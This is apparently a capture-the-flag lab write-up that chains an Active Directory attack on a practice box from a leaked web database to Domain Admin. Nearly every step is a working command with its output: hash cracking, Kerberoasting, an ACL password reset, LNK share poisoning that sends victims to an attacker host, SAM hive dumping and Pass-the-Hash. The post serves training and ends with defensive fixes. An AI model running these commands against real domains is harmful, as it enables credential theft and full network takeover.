---
title: "BuildingMagic — Active Directory Walkthrough: Web Leak to Domain Admin"
description: "Full Active Directory walkthrough of BuildingMagic (Windows Server 2022) — chaining a web DB leak, Kerberoasting, ACL abuse, share poisoning, and Pass-the-Hash into Domain Admin."
date: 2026-07-05 11:00:00 +0000
categories: [Active Directory]
tags: [active-directory, kerberoasting, acl-abuse, pass-the-hash, bloodhound, oscp]
difficulty: Hard
---

> **Box:** Active Directory (Hack Smarter / OSCP-style) · **OS:** Windows Server 2022 · **Domain:** BUILDINGMAGIC.LOCAL · **Theme:** Web DB leak → Kerberoast → ACL abuse → share poisoning → Pass-the-Hash

BuildingMagic is a full-length Active Directory chain and probably the most satisfying box in this set — it strings together half a dozen classic AD techniques into one clean path from an anonymous web portal all the way to Domain Admin. (It's Harry Potter–themed, so expect a lot of familiar surnames.)

## Recon

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ rustscan -a 10.0.27.163 -- -A
Open 10.0.27.163:53
Open 10.0.27.163:80
Open 10.0.27.163:88
Open 10.0.27.163:135
Open 10.0.27.163:139
Open 10.0.27.163:389
Open 10.0.27.163:445
Open 10.0.27.163:464
Open 10.0.27.163:593
Open 10.0.27.163:636
Open 10.0.27.163:3268
Open 10.0.27.163:3269
Open 10.0.27.163:3389
Open 10.0.27.163:5985
Open 10.0.27.163:8080
Open 10.0.27.163:9389
```

The interesting parts of the nmap output:

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: BUILDINGMAGIC.LOCAL)
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: BUILDINGMAGIC.LOCAL
|_  Product_Version: 10.0.20348
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0   # WinRM
8080/tcp  open  http          Werkzeug httpd 3.1.3 (Python 3.13.3)
|_http-title: Building Magic Application Portal
9389/tcp  open  mc-nmf        .NET Message Framing          # ADWS

Host script results:
| smb2-security-mode:
|_    Message signing enabled and required
```

Standard domain-controller port set — with two things worth noting: **SMB signing is enabled** (so no easy relay), and there's a **web app on 8080**. The certs gave me the domain **BUILDINGMAGIC.LOCAL** and host **DC01** — into `/etc/hosts` they went.

## Initial Foothold — leaked database

A null SMB session was allowed but gave up nothing useful:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ nxc smb 10.0.27.163 -u '' -p ''
SMB   10.0.27.163  445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:BUILDINGMAGIC.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB   10.0.27.163  445  DC01  [+] BUILDINGMAGIC.LOCAL\:
```

The way in was the **Building Magic Application Portal** on 8080, which leaked its backend user table — ten employees, each with an **MD5** password hash:

```text
id  username        full_name              role            password
1   r.widdleton     Ron Widdleton          Intern Builder  c4a21c4d438819d73d24851e7966229c
2   n.bottomsworth  Neville Bottomsworth    Planner        61ee643c5043eadbcdc6c9d1e3ebd298
3   l.layman        Luna Layman            Planner         8960516f904051176cc5ef67869de88f
4   c.smith         Chen Smith             Builder         bbd151e24516a48790b2cd5845e7f148
5   d.thomas        Dean Thomas            Builder         4d14ff3e264f6a9891aa6cea1cfa17cb
6   s.winnigan      Samuel Winnigan        HR Manager      078576a0569f4e0b758aedf650cb6d9a
7   p.jackson       Parvati Jackson        Shift Lead      eada74b2fa7f5e142ac412d767831b54
8   b.builder       Bob Builder            Electrician     dd4137bab3b52b55f99f18b7cd595448
9   t.ren           Theodore Ren           Safety Officer  bfaf794a81438488e57ee3954c27cd75
10  e.macmillan     Ernest Macmillan       Surveyor        47d23284395f618bea1959e710bc68ef
```

I saved the hashes and ran them through hashcat as raw MD5:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
c4a21c4d438819d73d24851e7966229c:lilronron
...
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 0 (MD5)
Recovered........: 1/10 (10.00%) Digests
```

One fell — **r.widdleton : lilronron**. The creds validated over SMB and exposed a custom share:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ nxc smb BUILDINGMAGIC.LOCAL -u 'r.widdleton' -p 'lilronron' --shares
SMB   10.0.27.163  445  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron
SMB   10.0.27.163  445  DC01  Share       Permissions   Remark
SMB   10.0.27.163  445  DC01  -----       -----------   ------
SMB   10.0.27.163  445  DC01  ADMIN$                    Remote Admin
SMB   10.0.27.163  445  DC01  C$                        Default share
SMB   10.0.27.163  445  DC01  File-Share                Central Repository of Building Magic's files.
SMB   10.0.27.163  445  DC01  IPC$        READ          Remote IPC
SMB   10.0.27.163  445  DC01  NETLOGON                  Logon server share
SMB   10.0.27.163  445  DC01  SYSVOL                    Logon server share
```

## Domain Enumeration — BloodHound

With a valid account I ran a full BloodHound collection to map the domain:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ nxc ldap 10.0.27.163 -u 'r.widdleton' -p 'lilronron' --bloodhound --collection All --dns-server 10.0.27.163
LDAP  10.0.27.163  389  DC01  [+] BUILDINGMAGIC.LOCAL\r.widdleton:lilronron
LDAP  10.0.27.163  389  DC01  Resolved collection methods: localadmin, group, container, psremote, acl, trusts, session, rdp, objectprops, dcom
LDAP  10.0.27.163  389  DC01  Done in 0M 44S
LDAP  10.0.27.163  389  DC01  Compressing output into /home/kali/.nxc/logs/DC01_..._bloodhound.zip
```

## Kerberoasting → r.haggard

BloodHound flagged a Kerberoastable account, so I requested its service ticket:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ sudo impacket-GetUserSPNs buildingmagic.local/r.widdleton:lilronron -dc-ip 10.0.27.163 -request -outputfile kerberoast.hashes
ServicePrincipalName                      Name       PasswordLastSet             Delegation
----------------------------------------  ---------  --------------------------  ----------
HOGWARTS-DC/r.hagrid.WIZARDING.THM:60111  r.haggard  2025-05-15 17:09:04.002067
```

That TGS cracked in seconds:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*r.haggard$BUILDINGMAGIC.LOCAL$buildingmagic.local/r.haggard*$4238...87ba0c:rubeushagrid
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
```

Creds: **r.haggard : rubeushagrid**.

## ACL Abuse — targeted password reset

BloodHound showed **r.haggard** could reset the password of **H.POTCH**. `net rpc` made that a one-liner:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ net rpc password "H.POTCH" "cyber@123" -U "buildingmagic.local"/"r.haggard"%"rubeushagrid" -S 10.0.27.163
```

And the payoff — H.POTCH has **READ,WRITE** on the `File-Share`:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ nxc smb 10.0.27.163 -u 'H.POTCH' -p 'cyber@123' --shares
SMB   10.0.27.163  445  DC01  [+] BUILDINGMAGIC.LOCAL\H.POTCH:cyber@123
SMB   10.0.27.163  445  DC01  File-Share   READ,WRITE   Central Repository of Building Magic's files.
```

## Share Poisoning → h.grangon

A writable file share that other users browse is a forced-authentication goldmine. I planted a malicious shortcut with netexec's `slinky` module:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ nxc smb 10.0.27.163 -u 'H.POTCH' -p 'cyber@123' -M slinky -o SERVER=10.200.64.188 SHARES=File-Share NAME=systemd
SLINKY  10.0.27.163  445  DC01  [+] Found writable share: File-Share
SLINKY  10.0.27.163  445  DC01  [+] Created LNK file on the File-Share share
```

When a user's Explorer rendered the folder, their machine authenticated to my Responder — yielding **h.grangon : magic4ever**.

## User Flag

h.grangon had WinRM access, so I logged straight in:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ evil-winrm -i DC01.BUILDINGMAGIC.LOCAL -u h.grangon -p 'magic4ever'
*Evil-WinRM* PS C:\Users\h.grangon\Desktop> type user.txt
701b51527b6d4105d9b16b412af2d604
```

## Privilege Escalation → Domain Admin (Pass-the-Hash)

From the h.grangon shell I dumped the local SAM and SYSTEM hives, pulled them down, and extracted the hashes offline:

```powershell
*Evil-WinRM* PS C:\> reg save hklm\sam c:\Temp\sam
The operation completed successfully.
*Evil-WinRM* PS C:\> reg save hklm\system c:\Temp\system
The operation completed successfully.
*Evil-WinRM* PS C:\Temp> download sam
*Evil-WinRM* PS C:\Temp> download system
```

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ impacket-secretsdump -system system -sam sam LOCAL
[*] Target system bootKey: 0xf61a94fb13f74350a1f87f509c8c455c
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:520126a03f5d5a8d836f1c4f34ede7ce:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

That local **Administrator NT hash** was the finish line — a straight Pass-the-Hash gave code execution as admin, and the root flag:

```bash
┌──(kali@kali)-[~/Desktop/Hack Smarter/BuildingMagic]
└─$ nxc smb 10.0.28.232 -u A.flatch -H 520126a03f5d5a8d836f1c4f34ede7ce -x 'type C:\users\Administrator\desktop\root.txt'
SMB   10.0.28.232  445  DC01  [+] BUILDINGMAGIC.LOCAL\A.flatch:520126a03f5d5a8d836f1c4f34ede7ce (Pwn3d!)
SMB   10.0.28.232  445  DC01  [+] Executed command via wmiexec
SMB   10.0.28.232  445  DC01  9557e65743416cfadadfb17f89b8651b
```

## Takeaways

- **App DB leaks seed the whole chain.** One exposed user table with weak MD5 hashes was the single foothold that unlocked everything else.
- **Kerberoasting punishes weak service-account passwords.** `rubeushagrid` should never have survived rockyou.
- **BloodHound turns noise into a path.** The r.haggard → H.POTCH reset right isn't obvious by hand — the graph makes it a click.
- **Writable shares = forced auth.** A share other users browse plus write access equals credential capture via a planted shortcut.
- **Defensive fixes:** don't expose backend databases through app endpoints, salt/stretch password storage, enforce strong service-account passwords (or gMSAs), audit dangerous ACLs, and lock down write permissions on shared folders.
